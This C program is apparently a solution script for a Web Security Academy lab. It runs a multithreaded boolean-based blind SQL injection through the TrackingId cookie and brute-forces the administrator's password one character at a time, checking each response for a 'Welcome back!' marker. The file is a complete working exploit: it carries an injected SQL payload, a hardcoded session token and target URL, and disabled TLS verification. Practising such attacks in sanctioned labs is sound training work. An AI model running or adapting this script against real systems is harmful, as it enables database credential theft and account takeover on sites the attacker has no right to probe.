#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdatomic.h>

// COMPILE: gcc -o scan scan.c -lcurl -lpthread -Wall -Wextra -O2

#define PASSWORD_LEN 20
#define CHARSET_LEN  36
#define NUM_THREADS  8   // tune based on server rate-limiting

static const char *BASE_URL     = "https://0a02002003b095f180300804001a00e7.web-security-academy.net/filter";
static const char *SESSION      = "s21IEYIYd0hbpTAF0o6IOiWo3nV7iSAc";

static char carac_list[CHARSET_LEN];
static char result[PASSWORD_LEN + 1];

// Per-position: which chars have been found
static atomic_int found[PASSWORD_LEN]; // 0 = not found, 1 = found

// ── Minimal write callback: stop early once "Welcome back!" is found ──────────
struct Memory {
    char  data[4096]; // we only need enough to detect the phrase
    size_t size;
    int   found_flag;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct Memory *mem = (struct Memory *)userp;

    size_t space = sizeof(mem->data) - mem->size - 1;
    size_t copy  = realsize < space ? realsize : space;
    memcpy(&mem->data[mem->size], contents, copy);
    mem->size += copy;
    mem->data[mem->size] = '\0';

    if (strstr(mem->data, "Welcome back!")) {
        mem->found_flag = 1;
        return 0; // returning 0 aborts the transfer early — saves download time
    }
    return realsize;
}

// ── Thread work unit ──────────────────────────────────────────────────────────
typedef struct {
    int  positions[PASSWORD_LEN]; // which positions this thread handles
    int  pos_count;
} ThreadArgs;

static void *worker(void *arg) {
    ThreadArgs *targ = (ThreadArgs *)arg;

    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,  write_callback);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,        10L);
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION,   (long)CURL_HTTP_VERSION_1_1);
    curl_easy_setopt(curl, CURLOPT_URL,            BASE_URL);
    // Keep the TCP connection alive across requests (connection reuse)
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);

    for (int pi = 0; pi < targ->pos_count; pi++) {
        int j = targ->positions[pi]; // 1-based position

        for (int i = 0; i < CHARSET_LEN; i++) {
            if (atomic_load(&found[j - 1])) break; // already found by another thread

            char trackingId[512];
            snprintf(trackingId, sizeof(trackingId),
                "TrackingId=JsWipToajZ8pRY0v'+and+(select+substring(password,%d,1)"
                "+from+users+where+username='administrator')+=+'%c'--",
                j, carac_list[i]);

            char cookieHeader[600];
            snprintf(cookieHeader, sizeof(cookieHeader),
                "Cookie: %s; session=%s", trackingId, SESSION);

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0");
            headers = curl_slist_append(headers, cookieHeader);

            struct Memory chunk = { .size = 0, .found_flag = 0, .data = {0} };

            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA,  &chunk);

            CURLcode res = curl_easy_perform(curl);
            curl_slist_free_all(headers);

            // CURLE_WRITE_ERROR is expected when we abort early on match
            if (res == CURLE_OK || res == CURLE_WRITE_ERROR) {
                if (chunk.found_flag) {
                    printf("[pos %2d] '%c' FOUND\n", j, carac_list[i]);
                    result[j - 1] = carac_list[i];
                    atomic_store(&found[j - 1], 1);
                    break;
                }
            } else {
                fprintf(stderr, "curl error at pos %d char '%c': %s\n",
                        j, carac_list[i], curl_easy_strerror(res));
            }
        }
    }

    curl_easy_cleanup(curl);
    return NULL;
}

int main(void) {
    // Build charset
    int idx = 0;
    for (char c = 'a'; c <= 'z'; c++) carac_list[idx++] = c;
    for (char c = '0'; c <= '9'; c++) carac_list[idx++] = c;

    memset(result, '?', PASSWORD_LEN);
    result[PASSWORD_LEN] = '\0';
    for (int i = 0; i < PASSWORD_LEN; i++) atomic_store(&found[i], 0);

    curl_global_init(CURL_GLOBAL_ALL);

    // ── Distribute positions across threads ───────────────────────────────────
    pthread_t     threads[NUM_THREADS];
    ThreadArgs    args[NUM_THREADS];

    for (int t = 0; t < NUM_THREADS; t++) args[t].pos_count = 0;

    for (int j = 1; j <= PASSWORD_LEN; j++) {
        int t = (j - 1) % NUM_THREADS;
        args[t].positions[args[t].pos_count++] = j;
    }

    for (int t = 0; t < NUM_THREADS; t++)
        pthread_create(&threads[t], NULL, worker, &args[t]);

    for (int t = 0; t < NUM_THREADS; t++)
        pthread_join(threads[t], NULL);

    curl_global_cleanup();

    printf("\nPassword: %s\n", result);
    return 0;
}